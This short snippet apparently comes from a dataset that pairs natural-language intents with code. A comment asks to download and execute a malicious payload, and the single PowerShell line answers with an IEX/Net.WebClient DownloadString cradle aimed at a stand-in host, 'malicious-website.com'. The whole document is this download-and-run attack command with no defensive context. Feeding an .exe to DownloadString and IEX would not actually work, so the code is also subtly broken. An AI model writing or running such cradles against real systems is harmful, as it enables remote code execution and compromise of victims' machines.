# Natural language intent:
# Download and execute a malicious payload from a specified website.

IEX (New-Object Net.WebClient).DownloadString('http://malicious-website.com/malicious-payload.exe');
